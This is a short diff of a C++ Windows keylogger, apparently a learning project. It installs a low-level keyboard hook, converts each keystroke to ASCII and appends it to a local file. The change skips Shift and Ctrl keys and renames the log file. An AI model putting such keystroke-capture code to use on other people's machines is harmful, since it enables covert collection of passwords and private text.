@@ -15,13 +15,16 @@ static LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lP
 		DWORD wVirtKey = strct->vkCode, wScanCode = strct->scanCode;
 
 		if (wVirtKey == VK_ESCAPE) PostQuitMessage(0);
+		if (wVirtKey == VK_RSHIFT || wVirtKey == VK_LSHIFT || wVirtKey == VK_RCONTROL || wVirtKey == VK_LCONTROL)
+			return CallNextHookEx(0, nCode, wParam, lParam);
+
 
 		BYTE lpKeyState[256];
 		GetKeyboardState(lpKeyState);
 		CHAR result;
 		ToAscii(wVirtKey, wScanCode, lpKeyState, (LPWORD)&result, 0);
 		
-		std::ofstream fout(TEXT("E:\\cppstudio.txt"), std::ios_base::out | std::ios_base::app);
+		std::ofstream fout(TEXT("Text.txt"), std::ios_base::out | std::ios_base::app);
 		if (!fout.is_open())
 		{
 			return NULL;
